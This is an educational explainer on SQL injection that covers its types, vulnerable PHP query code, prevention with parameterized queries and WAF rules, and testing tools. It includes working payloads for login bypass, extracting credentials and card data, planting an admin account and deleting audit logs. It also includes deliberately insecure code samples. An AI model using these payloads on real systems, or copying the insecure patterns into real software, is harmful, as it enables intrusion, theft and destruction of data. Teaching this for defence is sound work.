# SQL Injection

## What is SQL Injection?

SQL Injection is a code injection technique that exploits vulnerabilities in an application's database layer. It occurs when user input is not properly sanitized and is directly concatenated into SQL queries, allowing attackers to manipulate the database by injecting malicious SQL code.

## How SQL Injection Works

SQL injection attacks work by inserting malicious SQL statements into application entry points (such as web forms, URL parameters, or cookies) that are then executed by the database. The attacker exploits the fact that the application trusts user input and doesn't properly validate or escape it.

### Basic Process

1. **Identify vulnerable input fields**: Forms, URL parameters, cookies, HTTP headers
2. **Test for vulnerabilities**: Insert special characters like single quotes (`'`)
3. **Craft malicious payload**: Create SQL statements that manipulate the original query
4. **Execute and extract data**: Retrieve sensitive information or modify database content

## Types of SQL Injection

### 1. Classic SQL Injection (In-band)

The attacker uses the same communication channel to launch the attack and gather results.

### 2. Blind SQL Injection (Inferential)

The attacker doesn't see the result directly but infers information based on the application's behavior.

### 3. Out-of-band SQL Injection

The attacker uses different communication channels to launch the attack and gather results.

## Common SQL Injection Examples

### 1. Authentication Bypass

**Vulnerable Code:**

```sql
SELECT * FROM users WHERE username = '$username' AND password = '$password'
```

**Attack:**

```text
Username: admin' --
Password: anything
```

**Resulting Query:**

```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
```

The `--` comments out the password check, allowing login without a valid password.

### 2. Union-based Data Extraction

**Vulnerable Code:**

```sql
SELECT name, description FROM products WHERE id = $id
```

**Attack:**

```text
id = 1 UNION SELECT username, password FROM users --
```

**Resulting Query:**

```sql
SELECT name, description FROM products WHERE id = 1 UNION SELECT username, password FROM users --
```

### 3. Boolean-based Blind Injection

**Attack:**

```text
id = 1 AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'
```

The application's response indicates whether the first character of the username is 'a'.

### 4. Time-based Blind Injection

**Attack:**

```text
id = 1; IF (1=1) WAITFOR DELAY '00:00:05' --
```

If the condition is true, the response is delayed by 5 seconds.

## Real-world Attack Scenarios

### 1. Information Gathering

```sql
-- Get database version
1' UNION SELECT @@version --

-- List all tables
1' UNION SELECT table_name FROM information_schema.tables --

-- List columns in a specific table
1' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --
```

### 2. Data Exfiltration

```sql
-- Extract user credentials
1' UNION SELECT username, password FROM users --

-- Extract sensitive data
1' UNION SELECT credit_card_number, expiry_date FROM payments --
```

### 3. Database Manipulation

```sql
-- Insert malicious data
1'; INSERT INTO users (username, password, role) VALUES ('hacker', 'password123', 'admin') --

-- Delete records
1'; DELETE FROM audit_logs --

-- Update existing records
1'; UPDATE users SET password='hacked' WHERE username='admin' --
```

## Common Vulnerable Scenarios

### Web Form Login

```html
<form method="POST">
    <input name="username" type="text">
    <input name="password" type="password">
    <input type="submit" value="Login">
</form>
```

**Vulnerable Backend:**

```php
$query = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "' AND password = '" . $_POST['password'] . "'";
```

### URL Parameters

```text
https://example.com/product.php?id=1
```

**Vulnerable Backend:**

```php
$query = "SELECT * FROM products WHERE id = " . $_GET['id'];
```

### Search Functionality

```text
https://example.com/search.php?q=laptop
```

**Vulnerable Backend:**

```php
$query = "SELECT * FROM products WHERE name LIKE '%" . $_GET['q'] . "%'";
```

## Prevention Methods

### 1. Prepared Statements (Parameterized Queries)

**Secure PHP Example:**

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
```

**Secure Java Example:**

```java
String query = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement stmt = connection.prepareStatement(query);
stmt.setString(1, username);
stmt.setString(2, password);
```

### 2. Input Validation and Sanitization

```php
// Validate input
if (!preg_match('/^[a-zA-Z0-9_]+$/', $username)) {
    die("Invalid username format");
}

// Escape special characters
$username = mysqli_real_escape_string($connection, $username);
```

### 3. Stored Procedures

```sql
CREATE PROCEDURE GetUser(@Username NVARCHAR(50), @Password NVARCHAR(50))
AS
BEGIN
    SELECT * FROM users WHERE username = @Username AND password = @Password
END
```

### 4. Least Privilege Principle

- Use database accounts with minimal necessary permissions
- Separate database users for different application functions
- Avoid using administrative accounts for application connections

### 5. Web Application Firewalls (WAF)

Configure WAF rules to detect and block SQL injection attempts:

```apache
# Example ModSecurity rule
SecRule ARGS "@detectSQLi" \
    "id:1001,\
    phase:2,\
    block,\
    msg:'SQL Injection Attack Detected'"
```

### 6. Regular Security Testing

- Perform regular penetration testing
- Use automated scanning tools
- Implement code review processes
- Monitor database activity logs

## Detection and Testing Tools

### Automated Tools

- **SQLMap**: Automated SQL injection testing tool
- **Burp Suite**: Web application security testing platform
- **OWASP ZAP**: Free security testing proxy
- **Havij**: Automated SQL injection tool

### Manual Testing Techniques

```bash
# Basic SQL injection test
' OR '1'='1

# Comment injection
' --

# Union-based test
' UNION SELECT null,null,null --

# Error-based test
' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --
```

## Legal and Ethical Considerations

- **Only test on systems you own** or have explicit written permission to test
- **Follow responsible disclosure** if vulnerabilities are found
- **Understand local and international laws** regarding computer security testing
- **Use SQL injection knowledge for defensive purposes** and improving security

## Best Practices Summary

1. **Never trust user input** - Always validate and sanitize
2. **Use parameterized queries** - The most effective defense
3. **Implement proper error handling** - Don't expose database errors to users
4. **Apply principle of least privilege** - Limit database account permissions
5. **Keep software updated** - Regularly update database and application software
6. **Monitor and log** - Implement comprehensive logging and monitoring
7. **Regular security assessments** - Conduct periodic security testing

## References

- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [OWASP Top 10 - Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [SQL Injection Testing Guide](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.html)